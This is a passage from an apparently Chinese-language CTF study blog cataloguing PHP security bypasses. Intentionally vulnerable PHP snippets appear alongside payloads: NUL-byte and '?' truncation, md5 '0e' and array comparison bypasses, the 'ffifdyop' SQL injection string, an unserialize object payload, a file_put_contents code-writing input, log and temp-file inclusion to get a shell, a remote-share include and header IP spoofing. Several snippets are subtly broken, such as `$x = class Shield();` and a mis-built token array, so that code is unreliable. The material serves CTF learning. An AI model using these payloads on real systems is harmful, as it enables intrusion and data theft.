?a=1024.1\n&lt;?php\nif($_GET[id]) {\nmysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\nmysql_select_db(SAE_MYSQL_DB);\n$id = intval($_GET[id]); ## 这里过滤只有一个intval\n$query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));\nif ($_GET[id]==1024) {\n    echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;\n    }\n  else{\n    echo($query[content]);\n  }\n}\n</code></pre>\n<h2 id=\"浮点数精度忽略\"><a href=\"#浮点数精度忽略\" class=\"headerlink\" title=\"浮点数精度忽略\"></a>浮点数精度忽略</h2><pre><code class=\"php\">if ($req[&quot;number&quot;] != intval($req[&quot;number&quot;]))\n</code></pre>\n<p>在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。<br>输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。</p>\n<h2 id=\"多重加密\"><a href=\"#多重加密\" class=\"headerlink\" title=\"多重加密\"></a>多重加密</h2><p>题目中有：</p>\n<pre><code class=\"php\">$login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));\nif($login[&#39;user&#39;] === &#39;ichunqiu&#39;){echo $flag;}\n</code></pre>\n<p>本地则写：</p>\n<pre><code class=\"php\">&lt;?php\n$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);\n$token = base64_encode(gzcompress(serialize($arr)));\nprint_r($token);\n// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=\n?&gt;\n</code></pre>\n<h2 id=\"截断\"><a href=\"#截断\" class=\"headerlink\" title=\"截断\"></a>截断</h2><h3 id=\"iconv-异常字符截断\"><a href=\"#iconv-异常字符截断\" class=\"headerlink\" title=\"iconv 异常字符截断\"></a>iconv 异常字符截断</h3><pre><code class=\"php\">## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。\n## 这里chr(128)到chr(255)都可以截断。\n$a=&#39;1&#39;.char(130).&#39;2&#39;;\necho iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a); //将字符串的编码从UTF-8转到gbk\necho iconv(&#39;GB2312&#39;, &#39;UTF-8&#39;, $str); //将字符串的编码从GB2312转到UTF-8\n</code></pre>\n<h3 id=\"eregi、ereg可用-00截断\"><a href=\"#eregi、ereg可用-00截断\" class=\"headerlink\" title=\"eregi、ereg可用%00截断\"></a>eregi、ereg可用%00截断</h3><p>功能：正则匹配过滤<br>条件：要求php&lt;5.3.4</p>\n<pre><code class=\"php\">## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*\n#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag\n#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。\n#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 &gt; 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案\n&lt;?php\nif (isset ($_GET[&#39;password&#39;])) {\n    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;,$_GET[&#39;password&#39;]) === FALSE)    \n       {\n        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;\n    }\n    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)\n    {\n        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)\n        {\n            die(&#39;Flag: &#39; . $flag);\n        }\n        else\n        {\n            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);\n        }\n    }\n    else\n    {\n        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;\n    }\n}\n</code></pre>\n<h3 id=\"move-uploaded-file-用-0截断\"><a href=\"#move-uploaded-file-用-0截断\" class=\"headerlink\" title=\"move_uploaded_file 用\\0截断\"></a>move_uploaded_file 用\\0截断</h3><p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7<br>原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生<br>cve：<br><a href=\"https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348\" target=\"_blank\" rel=\"noopener\">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a></p>\n<p><code>move_uploaded_file($_FILES[&#39;x&#39;][&#39;tmp_name&#39;],&quot;/tmp/test.php\\x00.jpg&quot;)</code><br>上传抓包修改name为a.php\\0jpg（\\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\\0截断之后的字符，因此并不影响代码的验证逻辑。<br>但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p>\n<h3 id=\"include用？截断\"><a href=\"#include用？截断\" class=\"headerlink\" title=\"include用？截断\"></a>include用？截断</h3><pre><code class=\"php\">&lt;?php\n$name=$_GET[&#39;name&#39;];  \n$filename=$name.&#39;.php&#39;;  \ninclude $filename;  \n?&gt;\n</code></pre>\n<p>当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。<br>测试POC：<br><a href=\"http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?</a><br>则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。</p>\n<h3 id=\"系统长度截断\"><a href=\"#系统长度截断\" class=\"headerlink\" title=\"系统长度截断\"></a>系统长度截断</h3><p>这种方式在PHP5.3以后的版本中都已经得到了修复。<br>win260个字符，linux下4*1024=4096字节</p>\n<h3 id=\"mysql长度截断\"><a href=\"#mysql长度截断\" class=\"headerlink\" title=\"mysql长度截断\"></a>mysql长度截断</h3><p>mysql内的默认字符长度为255，超过的就没了。<br>由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning</p>\n<h3 id=\"mysql中utf-8截断\"><a href=\"#mysql中utf-8截断\" class=\"headerlink\" title=\"mysql中utf-8截断\"></a>mysql中utf-8截断</h3><p><code>insert into dvwa.test values (14,concat(&quot;admin&quot;,0xc1,&quot;abc&quot;))</code></p>\n<p>写入为admin</p>\n<h2 id=\"弱类型比较\"><a href=\"#弱类型比较\" class=\"headerlink\" title=\"弱类型比较\"></a>弱类型比较</h2><p>原理</p>\n<p>比较表：<a href=\"http://php.net/manual/zh/types.comparisons.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/types.comparisons.php</a></p>\n<p>以下等式会成立</p>\n<pre><code class=\"php\">&#39;&#39; == 0 == false\n&#39;123&#39; == 123\n&#39;abc&#39; == 0\n&#39;123a&#39; == 123\n&#39;0x01&#39; == 1\n&#39;0e123456789&#39; == &#39;0e987654321&#39;\n[false] == [0] == [NULL] == [&#39;&#39;]\nNULL == false == 0\ntrue == 1\n</code></pre>\n<h3 id=\"、-gt-、-lt-的弱类型比较\"><a href=\"#、-gt-、-lt-的弱类型比较\" class=\"headerlink\" title=\"==、&gt;、&lt;的弱类型比较\"></a>==、&gt;、&lt;的弱类型比较</h3><p>这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。</p>\n<pre><code class=\"php\">##方法1\n##$a[&quot;a1&quot;]=&quot;1e8%00&quot;;\n##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1\n##方法2\n##$a[&quot;a1&quot;]=[&quot;a&quot;];\n##使用数组，可以，因为数组恒大于数字或字符串\n##方法3\n##$a[&quot;a1&quot;]=1337a;\n##1337a过is_numeric，又由&gt;转成1337与1336比较\n&lt;?php\nis_numeric(@$a[&quot;a1&quot;])?die(&quot;nope&quot;):NULL;    \nif(@$a[&quot;a1&quot;]){\n        var_dump($a);\n        ($a[&quot;a1&quot;]&gt;1336)?$v1=1:NULL;\n}\nvar_dump($v1);\n</code></pre>\n<h3 id=\"switch-弱类型\"><a href=\"#switch-弱类型\" class=\"headerlink\" title=\"switch 弱类型\"></a>switch 弱类型</h3><pre><code class=\"php\">// 第一种：弱类型，1e==1\n// $x1=1e\n// 第二种：利用数组名字bypass\n// $x1=1[]\n// 传入后为string(3) &quot;1[]&quot;,但在switch那里为1\nif (isset($_GET[&#39;x1&#39;]))\n{ \n        $x1 = $_GET[&#39;x1&#39;]; \n        $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL; \n        switch ($x1) \n        { \n        case 0: \n        case 1: \n                $a=1; \n                break; \n        } \n}\n</code></pre>\n<h3 id=\"md5比较（0e相等、数组为Null）\"><a href=\"#md5比较（0e相等、数组为Null）\" class=\"headerlink\" title=\"md5比较（0e相等、数组为Null）\"></a>md5比较（0e相等、数组为Null）</h3><pre><code class=\"php\">md5(&#39;240610708&#39;) //0e462097431906509019562988736854\nmd5(&#39;QNKCDZO&#39;) //0e830400451993494058024219903391\n0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。\nmd5(&#39;240610708&#39;)==md5(&#39;QNKCDZO&#39;); //True\nmd5(&#39;240610708&#39;)===md5(&#39;QNKCDZO&#39;); //False\n\n这样的对应数值还有：\nvar_dump(md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;));\nvar_dump(md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;));\nvar_dump(sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;));\nvar_dump(sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;));\nvar_dump(&#39;0010e2&#39; == &#39;1e3&#39;);\nvar_dump(&#39;0x1234Ab&#39; == &#39;1193131&#39;);\nvar_dump(&#39;0xABCdef&#39; == &#39; 0xABCdef&#39;);\n</code></pre>\n<p>技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串</p>\n<pre><code class=\"php\">#方法1\n#s1=QNKCDZO&amp;s2=240610708\n#方法2\n#?s1[]=1&amp;s2[]=2\n#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null\n#则可以使：[1] !== [2] &amp;&amp; md5([1]) ===md5([2])\ndefine(&#39;FLAG&#39;, &#39;pwnhub{THIS_IS_FLAG}&#39;);\nif ($_GET[&#39;s1&#39;] != $_GET[&#39;s2&#39;]\n&amp;&amp; md5($_GET[&#39;s1&#39;]) == md5($_GET[&#39;s2&#39;])) {\necho &quot;success, flag:&quot; . FLAG;\n}\n</code></pre>\n<pre><code class=\"php\">##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null\n$name = addslashes($_POST[&#39;name&#39;]);\n$r = $db-&gt;get_row(&quot;SELECT `pass` FROM `user` WHERE `name`=&#39;{$name}&#39;&quot;);\nif ($r[&#39;pass&#39;] === md5($_POST[&#39;pass&#39;])) {\necho &quot;success&quot;;\n}\n</code></pre>\n<h3 id=\"json传数据-“key”-0\"><a href=\"#json传数据-“key”-0\" class=\"headerlink\" title=\"json传数据{“key”:0}\"></a>json传数据{“key”:0}</h3><p>PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。</p>\n<pre><code>application/x-www-form-urlencoded\nmultipart/form-data\napplication/json\napplication/xml\n</code></pre><p>第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.</p>\n<p>{“key”:”0”}</p>\n<p>这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：</p>\n<p>{“key”:0}</p>\n<h3 id=\"strcmp漏洞1：返回0\"><a href=\"#strcmp漏洞1：返回0\" class=\"headerlink\" title=\"strcmp漏洞1：返回0\"></a>strcmp漏洞1：返回0</h3><p>适用与5.3之前版本的php</p>\n<p><code>int strcmp ( string $str1 , string $str2 )</code><br>// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。</p>\n<pre><code class=\"php\">##flag[]=admin\ndefine(&#39;FLAG&#39;, &#39;pwnhub{THIS_IS_FLAG}&#39;);\nif (strcmp($_GET[&#39;flag&#39;], FLAG) == 0) {\necho &quot;success, flag:&quot; . FLAG;\n}\n</code></pre>\n<h3 id=\"strcmp漏洞2：返回Null\"><a href=\"#strcmp漏洞2：返回Null\" class=\"headerlink\" title=\"strcmp漏洞2：返回Null\"></a>strcmp漏洞2：返回Null</h3><p>修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。<br>array和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。<br><code>strcmp($c[1],$d)</code></p>\n<h3 id=\"strcmp漏洞3-判断使用的是\"><a href=\"#strcmp漏洞3-判断使用的是\" class=\"headerlink\" title=\"strcmp漏洞3: 判断使用的是 ==\"></a>strcmp漏洞3: 判断使用的是 ==</h3><p>而判断使用的是==，当NULL==0是 bool(true)</p>\n<h3 id=\"in-array，array-search-弱类型比较\"><a href=\"#in-array，array-search-弱类型比较\" class=\"headerlink\" title=\"in_array，array_search 弱类型比较\"></a>in_array，array_search 弱类型比较</h3><p>松散比较下，任何string都等于true：</p>\n<pre><code class=\"php\">// in_array(&#39;a&#39;, [true, &#39;b&#39;, &#39;c&#39;])       // 返回bool(true)，相当于数组里面有字符&#39;a&#39;\n// array_search(&#39;a&#39;, [true, &#39;b&#39;, &#39;c&#39;])   // 返回int(0)，相当于找到了字符&#39;a&#39;\n// array_search 会使用&#39;ctf&#39;和array中的每个值作比较，这里的比较也是弱比较，所以intval(&#39;ctf&#39;)==0.\nif(is_array(@$a[&quot;a2&quot;])){\n        if(count($a[&quot;a2&quot;])!==5 OR !is_array($a[&quot;a2&quot;][0])) die(&quot;nope&quot;);\n        $pos = array_search(&quot;ctf&quot;, $a[&quot;a2&quot;]);\n        $pos===false?die(&quot;nope&quot;):NULL;\n        foreach($a[&quot;a2&quot;] as $key=&gt;$val){\n            $val===&quot;ctf&quot;?die(&quot;nope&quot;):NULL;\n        }\n        $v2=1;\n}\n</code></pre>\n<h3 id=\"sha1-md5-报错相等绕过（False-False）\"><a href=\"#sha1-md5-报错相等绕过（False-False）\" class=\"headerlink\" title=\"sha1() md5() 报错相等绕过（False === False）\"></a>sha1() md5() 报错相等绕过（False === False）</h3><p>sha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false<br>md5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。</p>\n<pre><code class=\"php\">##?name[]=1&amp;password[]=2\n## === 两边都是false则成立\nif ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])\n    echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;\nelse if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))\n    die(&#39;Flag: &#39;.$flag);\n</code></pre>\n<h3 id=\"strpos数组NULL-Null-False\"><a href=\"#strpos数组NULL-Null-False\" class=\"headerlink\" title=\"strpos数组NULL(Null !== False)\"></a>strpos数组NULL(Null !== False)</h3><p>strpos()输入数组出错返回null</p>\n<pre><code class=\"php\">#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.\n&lt;?php\n$flag = &quot;flag&quot;;\n    if (isset ($_GET[&#39;nctf&#39;])) {\n        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE) # %00截断\n            echo &#39;必须输入数字才行&#39;;\n        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   \n            die(&#39;Flag: &#39;.$flag);\n        else\n            echo &#39;骚年，继续努力吧啊~&#39;;\n    }\n</code></pre>\n<h3 id=\"十六进制与十进制比较\"><a href=\"#十六进制与十进制比较\" class=\"headerlink\" title=\"十六进制与十进制比较\"></a>十六进制与十进制比较</h3><p>== 两边的十六进制与十进制比较，是可以相等的。</p>\n<pre><code class=\"php\">#?password=0xdeadc0de\n#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de\n&lt;?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n    $flag = &#39;flag{test}&#39;;\n    $one = ord(&#39;1&#39;);  //ord — 返回字符的 ASCII 码值\n    $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值\n    $number = &#39;3735929054&#39;;\n    // Check all the input characters!\n    for ($i = 0; $i &lt; strlen($number); $i++)\n    { \n        // Disallow all the digits!\n        $digit = ord($temp{$i});\n        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) ## 1到9不允许，但0允许\n        {\n            // Aha, digit not allowed!\n            return &quot;flase&quot;;\n        }\n    }\n    if($number == $temp) # \n        return $flag;\n}\n$temp = $_GET[&#39;password&#39;];\necho noother_says_correct($temp);\n</code></pre>\n<h2 id=\"md5注入带入’or’\"><a href=\"#md5注入带入’or’\" class=\"headerlink\" title=\"md5注入带入’or’\"></a>md5注入带入’or’</h2><p>原理：</p>\n<pre><code class=\"php\">md5(string,raw)\nraw    可选。规定十六进制或二进制输出格式：\n    TRUE - 原始 16 字符二进制格式\n    FALSE - 默认。32 字符十六进制数\n</code></pre>\n<p>当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为<code>&#39;or&#39;&lt;trash&gt;</code> 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。</p>\n<pre><code class=\"php\">## 执行顺序:字符串：ffifdyop -&gt; md5()加密成276f722736c95d99e921722cf9ed621c-&gt;md5(,true)将16进制转成字符串`&#39;or&#39;&lt;trash&gt;`-&gt;sql执行`&#39;or&#39;&lt;trash&gt;`造成注入\n$sql = &quot;SELECT * FROM admin WHERE username = admin pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;\n</code></pre>\n<h2 id=\"switch没有break\"><a href=\"#switch没有break\" class=\"headerlink\" title=\"switch没有break\"></a>switch没有break</h2><pre><code class=\"php\">#这里case 0 和 1 没有break,使得程序继续往下执行。\n&lt;?php\nerror_reporting(0);\nif (isset($_GET[&#39;which&#39;]))\n{\n    $which = $_GET[&#39;which&#39;];\n    switch ($which)\n    {\n    case 0:\n    case 1:\n    case 2:\n        require_once $which.&#39;.php&#39;;\n         echo $flag;\n        break;\n    default:\n        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);\n        break;\n    }\n}\n</code></pre>\n<h2 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h2><pre><code class=\"php\">&lt;!-- index.php --&gt;\n&lt;?php \n    require_once(&#39;shield.php&#39;);\n    $x = new Shield();\n    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];\n    if (!empty($g)) {\n        $x = unserialize($g);\n    }\n    echo $x-&gt;readfile();\n?&gt;\n&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;\n&lt;!-- shield.php --&gt;\n&lt;?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = &#39;&#39;) {\n            $this -&gt; file = $filename;\n        }\n\n        function readfile() {\n            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  \n            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\\\&#39;)==FALSE) {\n                return @file_get_contents($this-&gt;file);\n            }\n        }\n    }\n?&gt;\n&lt;!-- showimg.php --&gt;\n&lt;?php\n    $f = $_GET[&#39;img&#39;];\n    if (!empty($f)) {\n        $f = base64_decode($f);\n        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\\\&#39;)===FALSE\n        //stripos — 查找字符串首次出现的位置（不区分大小写）\n        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) {\n            readfile($f);\n        } else {\n            echo &quot;File not found!&quot;;\n        }\n    }\n?&gt;\n</code></pre>\n<pre><code class=\"php\">#?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}\n&lt;!-- answer.php --&gt;\n&lt;?php\n\nrequire_once(&#39;shield.php&#39;);\n$x = class Shield();\n$g = serialize($x);\necho $g;\n\n?&gt;\n\n&lt;!-- shield.php --&gt;\n&lt;?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = &#39;pctf.php&#39;) {\n            $this -&gt; file = $filename;\n        }\n\n        function readfile() {\n            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  \n            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\\\&#39;)==FALSE) {\n                return @file_get_contents($this-&gt;file);\n            }\n        }\n    }\n?&gt;\n</code></pre>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><p>原理：</p>\n<p>include()/include_once()，require()/require_once()，中的变量可控</p>\n<p>利用过程：</p>\n<pre><code>上传图片（含有php代码的图片） \n读文件，读php文件 \n包含日志文件getshell \n包含/proc/self/envion文件getshell \n如果有phpinfo可以包含临时文件 \n包含data://或php://input等伪协议（需要allow_url_include=On)\n</code></pre><p>封闭协议：</p>\n<pre><code>file:// — 访问本地文件系统\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n</code></pre><pre><code class=\"php\">## 访问共享目录\ninclude (&#39;\\evilservershell.php&#39;);\n</code></pre>\n<h2 id=\"提交参数无过滤\"><a href=\"#提交参数无过滤\" class=\"headerlink\" title=\"提交参数无过滤\"></a>提交参数无过滤</h2><p>原理:过滤了GPC，但没有过滤其它部分。</p>\n<pre><code class=\"bash\">上传文件相关变量如$_FIle\n$_GET，$_POST，$_Cookie，$_SERVER，$_ENV，$_SESSION，$_REQUEST\nHTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响\n$_HTTP_COOKIE_VARS\n$_HTTP_ENV_VARS\n$_HTTP_GET_VARS\n$_HTTP_POST_FILES\n$_HTTP_POST_VARS\n$_HTTP_SERVER_VARS\n</code></pre>\n<p>案例：</p>\n<pre><code class=\"php\">foreach($_COOKIE AS $_key=&gt;$_value){\n    unset($$_key);\n}\nforeach($_POST AS $_key=&gt;$_value){\n    !ereg(&quot;^\\_[A-Z]+&quot;,$_key) &amp;&amp; $$_key=$_POST[$_key];\n}\nforeach($_GET AS $_key=&gt;$_value){\n    !ereg(&quot;^\\_[A-Z]+&quot;,$_key) &amp;&amp; $$_key=$_GET[$_key];\n}\n</code></pre>\n<p>通过表单来传值。</p>\n<pre><code class=\"html\">&lt;form method=&quot;post&quot; action=&quot;http://localhost/qibo/member/comment.php?job=ifcom&quot; enctype=&quot;multipart/form-data&quot;&gt;\n&lt;input type=&quot;file&quot; name=&quot;cidDB&quot;&gt;  \n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n</code></pre>\n<p>这里的gid为查询参数</p>\n<pre><code class=\"php\">$_SERVER                 //中用户能够控制的变量，php5.0后不受GPC影响\nQUERY_STRING             //用户GET方法提交时的查询字符串\nHTTP_REFERER             //用户请求的来源变量，在一些程序取得用户访问记录时用得比较多\nHTTP_USER_AGENT          //用户的浏览器类型，也用于用户的访问记录的取得\nHTTP_HOST                //提交的主机头等内容\nHTTP_X_FORWARDED_FOR     //用户的代理主机的信息\n</code></pre>\n<h2 id=\"伪造IP\"><a href=\"#伪造IP\" class=\"headerlink\" title=\"伪造IP\"></a>伪造IP</h2><p>原理:<br>以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。</p>\n<pre><code class=\"php\">关键字：\nHTTP_\ngetenv\n$_SERVER\n服务端：\necho getenv(&#39;HTTP_CLIENT_IP&#39;);\necho $_SERVER[&#39;REMOTE_ADDR&#39;]; //访问端（有可能是用户，有可能是代理的）IP\necho $_SERVER[&#39;HTTP_CLIENT_IP&#39;]; //代理端的（有可能存在，可伪造）\necho $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）\n客户端：\n注意发送的格式：\nCLIENT-IP:10.10.10.1\nX-FORWARDED-FOR:10.10.10.10\n</code></pre>\n<pre><code>这个玩意恒成立的。不管有没有clientip\n【strcasecmp(getenv(&#39;HTTP_CLIENT_IP&#39;), &#39;unknown&#39;)】\n</code></pre><h2 id=\"绕过正则匹配\"><a href=\"#绕过正则匹配\" class=\"headerlink\" title=\"绕过正则匹配\"></a>绕过正则匹配</h2><h3 id=\"缺少-和-限定\"><a href=\"#缺少-和-限定\" class=\"headerlink\" title=\"缺少^和$限定\"></a>缺少^和$限定</h3><h3 id=\"数组绕过正则\"><a href=\"#数组绕过正则\" class=\"headerlink\" title=\"数组绕过正则\"></a>数组绕过正则</h3><p>【\\A[ _a-zA-Z0-9]+\\z】</p>\n<h3 id=\"str-replace路径穿越\"><a href=\"#str-replace路径穿越\" class=\"headerlink\" title=\"str_replace路径穿越\"></a>str_replace路径穿越</h3><p>原理<br>str_replace的过滤方式为其search参数数组从左到右一个一个过滤。</p>\n<pre><code class=\"php\">## 这里可以被绕过，因为是对.和/或\\的组合的过滤，所以单独的..或\\/没有检测到。\n## 方法1\n## 五个点加///\n## 方法2\n## ...././/\n$dir = str_replace(array(&#39;..\\\\&#39;, &#39;../&#39;, &#39;./&#39;, &#39;.\\\\&#39;), &#39;&#39;, trim($dir),$countb);\necho $dir;\necho &#39;&lt;/br&gt;替换数量&#39;;\necho $countb;\n</code></pre>\n<pre><code class=\"php\">## 这里有对单独的.进行过滤，所以无法绕过。\n$file = str_replace(array(&#39;../&#39;, &#39;\\\\&#39;, &#39;..&#39;), array(&#39;&#39;, &#39;/&#39;, &#39;&#39;), $_GET[&#39;file&#39;],$counta);\necho $file;\necho &#39;&lt;/br&gt;替换数量&#39;;\necho $counta;\n</code></pre>\n<h2 id=\"short-open-tag-on-短标签\"><a href=\"#short-open-tag-on-短标签\" class=\"headerlink\" title=\"short_open_tag=on 短标签\"></a>short_open_tag=on 短标签</h2><p>原理：<br>当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；<br>格式为：&lt;?xxxx;?&gt; –&gt; &lt;?xxx;</p>\n<pre><code class=\"bash\">Go0s@ubuntu:~$ cat test.php\n&lt;?=&quot;helloworld&quot;;\nGo0s@ubuntu:~$ curl 127.0.0.1/test.php\nhelloworld\n</code></pre>\n<h2 id=\"file-put-contents第二个参数传入数组\"><a href=\"#file-put-contents第二个参数传入数组\" class=\"headerlink\" title=\"file_put_contents第二个参数传入数组\"></a>file_put_contents第二个参数传入数组</h2><p>原理：</p>\n<pre><code class=\"php\">file_put_contents(file,data,mode,context)\nfile    必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。\ndata    可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。\n</code></pre>\n<pre><code class=\"php\">## ?filename=xiaowei.php&amp;data[]=&lt;?php&amp;data[]=%0aphpinfo();\n## 这个要从burp去传，因为后面的【?】会被理解为参数而截断\n&lt;?php\n$a = $_GET[&#39;data&#39;];\n$file = $_GET[&#39;filename&#39;];\n$current = file_get_contents($file);\nfile_put_contents($file, $a);\n</code></pre>\n<h2 id=\"单引号和双引号\"><a href=\"#单引号和双引号\" class=\"headerlink\" title=\"单引号和双引号\"></a>单引号和双引号</h2><p>原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。</p>\n<pre><code class=\"php\"># 1\n$s = &quot;I am a &#39;single quote string&#39; inside a double quote string&quot;; \n$s = &#39;I am a &quot;double quote string&quot; inside a single quote string&#39;; \n$s = &quot;I am a &#39;single quote string&#39; inside a double quote string&quot;; \n$s = &#39;I am a &quot;double quote string&quot; inside a single quote string&#39;;\n# 2\n$abc=&#39;I love u&#39;; \necho $abc //结果是:I love u \necho &#39;$abc&#39; //结果是:$abc \necho &quot;$abc&quot; //结果是:I love u \n# 3\n$a=&quot;${@phpinfo()}&quot;; //可以解析出来\n&lt;?php $a=&quot;${@phpinfo()}&quot;;?&gt; //@可以为空格，tab，/**/ ，回车，+，-，!，~,\\等\n</code></pre>\n<h3 id=\"查询语句缺少单引号\"><a 